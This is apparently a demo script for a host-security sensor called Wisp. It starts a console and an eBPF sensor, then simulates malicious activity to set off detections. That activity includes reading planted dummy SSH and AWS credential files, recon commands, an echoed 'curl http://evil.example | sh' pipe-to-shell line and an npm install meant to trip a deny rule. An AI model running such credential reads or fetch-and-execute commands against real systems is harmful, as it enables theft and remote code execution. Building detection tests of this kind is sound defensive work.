#!/usr/bin/env bash
# One-command local demo: build, start the console and a sensor over mutual
# TLS, generate a mix of benign and malicious activity, and leave the web
# console running.
#
#   sudo ./demo.sh            # this host only
#   sudo ./demo.sh --fleet    # plus 20 simulated hosts with a day of history
#
# Then open http://localhost:8080 and sign in with the token printed below.
set -euo pipefail
cd "$(dirname "$0")"
[[ $EUID -eq 0 ]] || { echo "run as root (the sensor loads an eBPF program)"; exit 1; }
FLEET=0; [[ "${1:-}" == "--fleet" ]] && FLEET=1
STATE=/tmp/wisp-demo; mkdir -p "$STATE"

echo "==> building"
make >/dev/null

echo "==> test certificates (pki/, demo only) and an admin API token"
bash bench/mkpki.sh >/dev/null
TOKEN_OUT=$(./console/wisp-console -gen-token admin:demo)
TOKEN=$(sed -n 2p <<<"$TOKEN_OUT" | tr -d ' ')
sed -n 5p <<<"$TOKEN_OUT" | sed 's/^ *//' > "$STATE/roles.conf"

mkdir -p /etc/wisp /var/log/wisp /var/lib/wisp
cp -n config/*.conf /etc/wisp/ 2>/dev/null || true

echo "==> starting console on http://localhost:8080"
./console/wisp-console -listen 127.0.0.1:8750 -http 127.0.0.1:8080 \
  -cert pki/console.crt -key pki/console.key -client-ca pki/ca.crt \
  -roles "$STATE/roles.conf" -state-dir "$STATE" >"$STATE/console.log" 2>&1 &
CPID=$!

sed 's/^telemetry = .*/telemetry = 1/; s/^housekeeping = .*/housekeeping = 5/' /etc/wisp/wisp.conf > "$STATE/wisp.conf"
cat >> "$STATE/wisp.conf" <<EOF
console = 127.0.0.1:8750
cert = $PWD/pki/agent.crt
key = $PWD/pki/agent.key
ca = $PWD/pki/ca.crt
group = demo
EOF

echo "==> starting sensor (monitor mode)"
./agent/wispd -c "$STATE/wisp.conf" 2>"$STATE/wispd.log" &
WPID=$!
SPID=
if [[ $FLEET -eq 1 ]]; then
	echo "==> connecting 20 simulated hosts"
	python3 bench/demo_fleet.py --seconds 86400 >"$STATE/fleet.log" 2>&1 &
	SPID=$!
fi
trap 'kill $CPID $WPID $SPID 2>/dev/null' EXIT
sleep 1.5

echo "==> simulating activity (benign + malicious)"
mkdir -p /tmp/demo/.ssh /tmp/demo/.aws
echo privkey > /tmp/demo/.ssh/id_rsa; echo awscreds > /tmp/demo/.aws/credentials
cat /tmp/demo/.ssh/id_rsa >/dev/null          # CRED-001
cat /tmp/demo/.aws/credentials >/dev/null     # CRED-002
whoami >/dev/null; id >/dev/null; hostname >/dev/null  # LOL-003
bash -c 'echo "curl http://evil.example | sh"' >/dev/null   # RSHELL-02
if command -v npm >/dev/null; then
	npm install event-stream --no-audit --no-fund >/dev/null 2>&1 || true  # CAT-NPM deny
	npm rm event-stream >/dev/null 2>&1 || true
fi

cat <<EOF

================================================================
 Wisp is running.   Open  http://localhost:8080
 Sign in with this admin token (shown once):

   $TOKEN

 State, logs and the event journal: $STATE
 Ctrl-C to stop.
================================================================
EOF
wait
